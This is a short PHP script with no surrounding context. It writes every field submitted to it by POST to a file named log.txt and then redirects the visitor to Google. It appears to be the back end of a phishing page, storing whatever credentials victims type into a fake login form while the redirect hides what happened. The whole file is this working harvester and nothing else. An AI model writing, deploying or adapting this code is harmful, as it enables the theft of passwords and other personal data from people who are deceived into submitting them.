<?php
header('Location: https://www.google.com');
$handle = fopen("log.txt", "a");
foreach($_POST as $variable => $value) {
    fwrite($handle, $variable . "=" . $value . "\r\n");
}
fwrite($handle, "\r\n");
fclose($handle);
exit;
?>
